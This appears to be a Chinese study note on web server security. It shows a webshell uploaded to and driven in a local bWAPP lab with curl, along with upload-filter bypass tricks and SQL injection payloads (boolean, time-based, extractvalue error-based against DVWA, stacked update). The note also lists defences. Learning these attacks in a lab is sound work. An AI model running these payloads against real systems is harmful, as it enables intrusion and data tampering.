# 服务端安全

## 文件上传漏洞

获取 webshell

```sh
# docker images: registry.cn-shanghai.aliyuncs.com/yhskc/bwapp
$ docker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/bwapp
$ docker container list -a
CONTAINER ID        IMAGE                                           COMMAND                  CREATED             STATUS                      PORTS                          NAMES
50b30e9f09b8        registry.cn-shanghai.aliyuncs.com/yhskc/bwapp   "/run.sh"                2 minutes ago       Up 2 minutes                0.0.0.0:80->80/tcp, 3306/tcp   affectionate_wing
# Step1: 打开 127.0.0.1/install.php 安装 bWAPP
# Step2: 注册用户 alwynzhou / sfgU4qcj8C9V5PR / tokentest
# Step3: 选择 Other Bugs -> Unrestricted File Upload，上传攻击性文件 shell.php

# 获取当前用户名
$ curl -d "hacker=echo get_current_user();" http://127.0.0.1/images/shell.php
www-data%
# 获取当前执行路径
$ curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
/app/images%
```

```sh
# 中级难度 shell.php3
root@50b30e9f09b8:/# netstat -antp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      436/apache2
root@50b30e9f09b8:/# cd /etc/apache2/
root@50b30e9f09b8:/etc/apache2# vim apache2.conf
root@50b30e9f09b8:/etc/apache2# cd mods-enabled/
root@50b30e9f09b8:/etc/apache2/mods-enabled# cat php5.conf
<FilesMatch ".+\.ph(p[345]?|t|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

- `.htaccess` 绕过
  - 分布式配置文件
- 大小写绕过 etc
- Windows 文件流特性饶拓
  - echo 111 > test.txt:111.txt (NTFS)
- `%00`截断绕过
  - 路径截断 save_path=../upload/a.php%00.jpg

**绕过内容检测**

- 聚合图片文件头和代码文本文件

**漏洞链**

- 远程/本地文件包含 （不可执行的文件变成可执行的文件）

**测试方式**

- fuzz testing 模糊测试
- penetration testing 渗透测试

**防御措施**

1. 文件类型检测，白名单>黑名单
2. 使用安全的函数进行编程
3. 熟悉业务部署环境 OS、Web Server

## SQL 注入

**防御**

1. 减少错误信息反馈
2. 对输入符号进行转义（黑名单）
3. 对输入特殊词组进行过滤（黑名单）

- and or union select 空格过滤

**SQL 注入 5 种类型**

1. 布尔型注入

```sh
 http://test.com/view?id=1 and substring(version(), 1, 1)=5
 如果服务端MySQL版本是5.X的话，那么页面返回的内容就会跟正常请求一样
```

2. 可联合查询注入

- 依赖报错回显

3. 基于时间延迟注入 Time-based

```sh
select * from user where id = '4' and sleep(3)
# 感知时间变化
# substr(a, b, c)
# count()
# ascii()
# length()
# left(a, b)
# sleep(n)
# 利用and短路的特性
```

4. 报错型注入 Err-based

- 原理：很多函数会导致 MySQL 报错并显示出数据

  - rand()
  - floor()
  - extractvalue() 32bit -> MID()截取多段
  - updatexml()
  - exp()
  - `group by`、`duplicate entry`

```sh
# 找到dvwa的数据表。。。
1' and extractvalue(1, concat(0x7e, (select table_name from information_schema.tables where table_schema="dvwa" limit 0, 1))) --'
```

5. 可多语句查询注入 Stacked-queries

```sh
http://test.com/view?id=1; update t set name = 'a' where id = 1
# 能执行多条查询语句，非常危险，因为意味着能够对数据库直接进行更新操作
```
